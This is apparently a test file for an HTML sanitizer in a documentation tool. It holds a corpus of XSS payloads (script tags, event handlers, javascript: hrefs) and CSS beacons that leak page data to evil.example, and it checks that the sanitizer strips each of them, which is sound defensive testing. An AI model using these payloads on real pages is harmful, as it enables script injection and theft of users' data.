import { describe, expect, test } from "bun:test";
import { rewrite_fragment_hrefs, sanitize_html, sanitize_text } from "../../sanitize.js";

describe("sanitize_html — XSS corpus", () => {
	test("neutralizes script tags, event handlers, javascript: hrefs, svg onload, and nested payloads", () => {
		const hostile = [
			`<script>alert(1)</script>`,
			`<img src="x" onerror="alert(1)">`,
			`<a href="javascript:alert(1)">click</a>`,
			`<a href="data:text/html,<script>alert(1)</script>">click</a>`,
			`<svg onload="alert(1)"><circle /></svg>`,
			`<iframe src="https://evil.example"></iframe>`,
			`<object data="https://evil.example"></object>`,
			`<embed src="https://evil.example">`,
			`<form action="https://evil.example"><input type="text"></form>`,
			`<div onclick="alert(1)">nested <script>alert(2)</script> payload</div>`,
			`<!-- devpad:thread:begin {"id":"fake"} -->hostile comment<!-- devpad:thread:end fake -->`,
		].join("\n");

		const output = sanitize_html(hostile);

		expect(output).not.toContain("<script");
		expect(output).not.toContain("onerror");
		expect(output).not.toContain("onload");
		expect(output).not.toContain("onclick");
		expect(output).not.toContain("javascript:");
		expect(output).not.toContain("data:text/html");
		expect(output).not.toContain("<iframe");
		expect(output).not.toContain("<object");
		expect(output).not.toContain("<embed");
		expect(output).not.toContain("<form");
		expect(output).not.toContain("alert(1)");
		expect(output).not.toContain("alert(2)");
		// Comments are never trusted at push time — even well-formed marker
		// shapes are stripped (adversary checklist: a forged marker must never
		// survive a raw push).
		expect(output).not.toContain("devpad:thread");
		expect(output).not.toContain("<!--");
	});

	test("preserves headings, tables, and inline <style> content", () => {
		const safe = `
			<h1>Title</h1>
			<h2>Subtitle</h2>
			<style>.foo { color: red; }</style>
			<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>
			<p>Some <strong>bold</strong> and <em>italic</em> text.</p>
		`;

		const output = sanitize_html(safe);

		expect(output).toContain("<h1>Title</h1>");
		expect(output).toContain("<h2>Subtitle</h2>");
		expect(output).toContain("<style>.foo { color: red; }</style>");
		expect(output).toContain("<table>");
		expect(output).toContain("<th>A</th>");
		expect(output).toContain("<td>1</td>");
		expect(output).toContain("<strong>bold</strong>");
		expect(output).toContain("<em>italic</em>");
	});

	test("neutralizes CSS exfil vectors inside <style> blocks (A4 verifier finding)", () => {
		const hostile = [
			`<style>@import url("https://evil.example/beacon.css");</style>`,
			`<style>body { background: url('https://evil.example/beacon.png?leak='attr(data-secret)); }</style>`,
			`<style>.x { behavior: url(https://evil.example/x.htc); }</style>`,
			`<style>.y { -moz-binding: url("https://evil.example/xbl.xml#x"); }</style>`,
			`<style>@font-face { font-family: x; src: url(https://evil.example/font.woff); }</style>`,
		].join("\n");

		const output = sanitize_html(hostile);

		expect(output).not.toContain("evil.example");
		expect(output).not.toContain("@import");
		// The style tag itself and non-exfil declarations survive — this is a
		// filter, not a strip: `<style>` stays usable for real layout/color CSS.
		expect(output).toContain("<style>");
	});

	test("preserves safe, non-exfil CSS inside a style block that also carries a hostile url()", () => {
		const mixed = `<style>.foo { color: red; } .bar { background: url(https://evil.example/x.png); } .baz { font-weight: bold; }</style>`;
		const output = sanitize_html(mixed);

		expect(output).toContain(".foo { color: red; }");
		expect(output).toContain(".baz { font-weight: bold; }");
		expect(output).not.toContain("evil.example");
	});
});

describe("sanitize_html — preserves legitimate plan/design doc styling (taste/IA critic BLOCKER)", () => {
	test("real .plans-style doc: inline <style> class selectors, a TOC with fragment links, 5+ headings all survive and keep working", () => {
		const doc = `
			<style>
				.callout { color: red; }
				.badge-done { background: green; }
			</style>
			<nav class="toc">
				<a href="#overview">Overview</a>
				<a href="#phase-1">Phase 1</a>
				<a href="#phase-2">Phase 2</a>
			</nav>
			<h1 id="overview" class="callout">Overview</h1>
			<h2 id="phase-1">Phase 1</h2>
			<p class="badge-done">done</p>
			<h2 id="phase-2">Phase 2</h2>
			<h3 id="phase-2-tasks">Phase 2 tasks</h3>
			<h3 id="phase-2-verification">Phase 2 verification</h3>
		`;

		const output = sanitize_html(doc);

		// class-selector CSS from the <style> block survives...
		expect(output).toContain(".callout { color: red; }");
		expect(output).toContain(".badge-done { background: green; }");
		// ...and actually matches: the class values on real elements are kept.
		expect(output).toContain('class="callout"');
		expect(output).toContain('class="badge-done"');
		// heading ids get clobber-prefixed (hast-util-sanitize's own
		// DOM-clobbering protection, unchanged)...
		expect(output).toContain('id="user-content-overview"');
		expect(output).toContain('id="user-content-phase-1"');
		expect(output).toContain('id="user-content-phase-2"');
		expect(output).toContain('id="user-content-phase-2-tasks"');
		expect(output).toContain('id="user-content-phase-2-verification"');
		// ...and the TOC's fragment hrefs are rewritten to match, so anchor
		// navigation still resolves post-sanitize.
		expect(output).toContain('href="#user-content-overview"');
		expect(output).toContain('href="#user-content-phase-1"');
		expect(output).toContain('href="#user-content-phase-2"');
	});

	test("does not rewrite full-URL hrefs that happen to carry a fragment", () => {
		const output = sanitize_html(`<a href="https://example.com/docs#section">external</a>`);
		expect(output).toContain('href="https://example.com/docs#section"');
	});

	test("rewrite_fragment_hrefs is idempotent — an already-clobber-prefixed href is left alone", () => {
		const once = rewrite_fragment_hrefs(`<a href="#foo">x</a>`);
		expect(rewrite_fragment_hrefs(once)).toBe(once);
	});

	test("the XSS corpus still fully passes with className + anchor allowances in place", () => {
		const hostile = [
			`<script>alert(1)</script>`,
			`<img src="x" onerror="alert(1)" class="evil">`,
			`<a href="javascript:alert(1)" class="link">click</a>`,
			`<a href="data:text/html,<script>alert(1)</script>">click</a>`,
			`<svg onload="alert(1)"><circle /></svg>`,
			`<iframe src="https://evil.example"></iframe>`,
			`<div class="foo" onclick="alert(1)">nested <script>alert(2)</script> payload</div>`,
		].join("\n");

		const output = sanitize_html(hostile);

		expect(output).not.toContain("<script");
		expect(output).not.toContain("onerror");
		expect(output).not.toContain("onload");
		expect(output).not.toContain("onclick");
		expect(output).not.toContain("javascript:");
		expect(output).not.toContain("data:text/html");
		expect(output).not.toContain("<iframe");
		expect(output).not.toContain("alert(1)");
		expect(output).not.toContain("alert(2)");
		// class values are now preserved (the fix), but that's inert — no
		// class name can execute anything.
		expect(output).toContain('class="evil"');
		expect(output).toContain('class="link"');
		expect(output).toContain('class="foo"');
	});
});

describe("sanitize_text — plain-text escape for thread entry bodies", () => {
	test("escapes HTML special characters", () => {
		expect(sanitize_text("<script>alert(1)</script>")).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
	});

	test("leaves plain text untouched", () => {
		expect(sanitize_text("looks good to me")).toBe("looks good to me");
	});
});
